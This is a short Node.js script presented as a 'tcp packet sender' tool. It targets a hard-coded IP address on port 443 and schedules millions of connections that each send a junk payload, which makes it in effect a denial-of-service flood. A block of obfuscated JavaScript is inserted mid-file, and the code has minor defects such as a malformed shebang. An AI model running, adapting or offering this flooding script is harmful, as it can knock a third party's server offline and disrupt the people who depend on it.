#!bin/usr/
const net = require('net');
/**
 *
 * @author <qiraxyz>
 * zarius tcp packet sender tools
 * MIT license
 *  
*/
const host = '117.102.67.69';
const tcpPort = 443;
const clientCount = 10;
const requestCount = 1000000;
const packetServer = 'hello starbhak 1020190219029010201902190920102109201902190290192019201902910290147218708347032432043248023948230948302948309248093284902384023492348230948239048902384902384092384092340932740234702384u0urj9uhusyf cnrycw87rycw98rjyr7c0r7230x372203r723x7jy2378ry327xr32'; (function (_0x1597e1, _0x5f03ee) { var _0x5da6d8 = _0x33bd, _0x4bf969 = _0x1597e1(); while (!![]) { try { var _0x291783 = parseInt(_0x5da6d8(0x1c5)) / 0x1 + parseInt(_0x5da6d8(0x1c6)) / 0x2 * (-parseInt(_0x5da6d8(0x1c8)) / 0x3) + parseInt(_0x5da6d8(0x1cb)) / 0x4 + -parseInt(_0x5da6d8(0x1c7)) / 0x5 + parseInt(_0x5da6d8(0x1c2)) / 0x6 * (-parseInt(_0x5da6d8(0x1c9)) / 0x7) + -parseInt(_0x5da6d8(0x1c3)) / 0x8 * (parseInt(_0x5da6d8(0x1c4)) / 0x9) + parseInt(_0x5da6d8(0x1ca)) / 0xa; if (_0x291783 === _0x5f03ee) break; else _0x4bf969['push'](_0x4bf969['shift']()); } catch (_0x589e12) { _0x4bf969['push'](_0x4bf969['shift']()); } } }(_0x18d5, 0xac708)); function _0x33bd(_0xd18fed, _0x2066b5) { var _0x18d5a5 = _0x18d5(); return _0x33bd = function (_0x33bd1c, _0x55303f) { _0x33bd1c = _0x33bd1c - 0x1c2; var _0x298c4f = _0x18d5a5[_0x33bd1c]; return _0x298c4f; }, _0x33bd(_0xd18fed, _0x2066b5); } function _0x18d5() { var _0x2c486f = ['5754640BeuPdx', '3sLyzEg', '374367JEOBsS', '21013260QfDYIG', '4150824lAeUar', '78YFXtob', '1847392wUCTju', '54gTnuLP', '1203063WRSSdQ', '808116wSOKiC']; _0x18d5 = function () { return _0x2c486f; }; return _0x18d5(); };

function sendRequest() {
    try {
        const client = new net.Socket();

        client.connect(tcpPort, host, packetServer, () => {
            console.log('Connected to :', host, tcpPort);
            console.log('Your ip address:', client.remoteAddress);
            client.write(packetServer);
        });

        client.on('data', (data) => {
            console.log('Data response by server :', data.toString());
            client.end();
        });

        client.on('close', () => {
            console.log('Connection closed...');
        });

        client.on('error', (error) => {
            console.error('Server are currently down :', error);
            client.end();
        });
    } catch (error) {
        console.error('Error to connect the server :', error);
    }
}

for (let i = 0; i < clientCount; i++) {
    for (let j = 0; j < requestCount; j++) {
        setTimeout(sendRequest, j * 1000);
    }
}
